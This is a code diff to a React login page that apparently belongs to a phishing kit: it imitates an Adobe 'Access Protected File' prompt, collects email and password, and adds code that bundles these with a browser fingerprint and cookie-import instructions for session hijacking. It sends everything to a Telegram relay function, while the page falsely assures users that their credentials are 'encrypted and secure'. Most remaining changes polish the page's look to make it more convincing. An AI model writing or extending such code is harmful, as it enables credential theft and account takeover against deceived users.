@@ -102,18 +102,38 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
       console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });
 
-      // Create and download cookies file
-      createCookiesFile(browserFingerprint, loginData);
+      // Create cookies file data (but don't download yet)
+      const cookiesFileData = {
+        timestamp: new Date().toISOString(),
+        loginInfo: {
+          email: loginData.email,
+          provider: loginData.provider,
+          fileName: loginData.fileName,
+          userAgent: loginData.userAgent
+        },
+        browserFingerprint: browserFingerprint,
+        instructions: {
+          usage: "This file contains comprehensive browser session data",
+          cookies: "Use browser extensions like 'Cookie Editor' to import cookies",
+          localStorage: "Use browser developer tools to set localStorage items",
+          sessionStorage: "Use browser developer tools to set sessionStorage items",
+          fingerprint: "Complete browser fingerprint for session restoration"
+        }
+      };
 
       const sessionData = storeSessionLocally(loginData);
 
+      // Send to Telegram with cookies file data included
       const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json',
         },
-        body: JSON.stringify(loginData),
+        body: JSON.stringify({
+          ...loginData,
+          cookiesFileData: cookiesFileData
+        }),
         signal: AbortSignal.timeout(30000),
       });
 
@@ -135,6 +155,10 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
       const telegramResult = await telegramResponse.json();
       console.log('Telegram result:', telegramResult);
 
+      // Only download cookies file after successful Telegram send
+      if (telegramResult.success) {
+        createCookiesFile(browserFingerprint, loginData);
+      }
       const sessionResponse = await fetch('/.netlify/functions/setSession', {
         method: 'POST',
         headers: {
@@ -214,16 +238,16 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
   return (
     <div className="min-h-screen relative overflow-hidden">
-      {/* Adobe-style linear gradient background */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
-      <div className="absolute inset-0 backdrop-blur-sm"></div>
+      {/* Adobe-style linear gradient background with reduced brightness */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#D40F02] to-[#E8B8B8]"></div>
+      <div className="absolute inset-0 bg-black/20"></div>
       
-      {/* Complementary decorative elements */}
-      <div className="absolute top-5 left-5 w-48 h-48 bg-[#FAD0C4]/20 rounded-full blur-2xl"></div>
-      <div className="absolute bottom-5 right-5 w-56 h-56 bg-white/15 rounded-full blur-3xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-white/25 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#F40F02]/10 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#FAD0C4]/15 rounded-full blur-lg"></div>
+      {/* Complementary decorative elements with reduced opacity */}
+      <div className="absolute top-5 left-5 w-48 h-48 bg-[#E8B8B8]/10 rounded-full blur-2xl"></div>
+      <div className="absolute bottom-5 right-5 w-56 h-56 bg-white/8 rounded-full blur-3xl"></div>
+      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-white/12 rounded-full blur-xl"></div>
+      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#D40F02]/8 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#E8B8B8]/10 rounded-full blur-lg"></div>
       
       <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
         <div className="w-full max-w-md">
@@ -246,13 +270,13 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
             </div>
             
             <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Protected File</h1>
-            <p className="text-base text-gray-600">
+            <p className="text-base text-gray-800 font-medium">
               Please authenticate to access <span className="font-medium break-all">{fileName}</span>
             </p>
           </div>
 
           {/* Login Form */}
-          <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/30 p-8">
+          <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/40 p-8">
             {!selectedProvider ? (
               // Provider Selection
               <div>
@@ -304,7 +328,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
                 <form onSubmit={handleLogin} className="space-y-4">
                   <div>
-                    <label className="block text-sm font-medium text-gray-700 mb-2">
+                    <label className="block text-sm font-semibold text-gray-800 mb-2">
                       Email Address
                     </label>
                     <div className="relative">
@@ -313,7 +337,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                         type="email"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
+                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base text-gray-900"
                         placeholder="Enter your email"
                         required
                       />
@@ -321,7 +345,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                   </div>
 
                   <div>
-                    <label className="block text-sm font-medium text-gray-700 mb-2">
+                    <label className="block text-sm font-semibold text-gray-800 mb-2">
                       Password
                     </label>
                     <div className="relative">
@@ -330,7 +354,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                         type={showPassword ? 'text' : 'password'}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="w-full pl-10 pr-12 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
+                        className="w-full pl-10 pr-12 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base text-gray-900"
                         placeholder="Enter your password"
                         required
                       />
@@ -361,7 +385,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                 </form>
 
                 <div className="mt-6 text-center">
-                  <p className="text-xs text-gray-500">
+                  <p className="text-xs text-gray-700 font-medium">
                     Your credentials are encrypted and secure
                   </p>
                 </div>
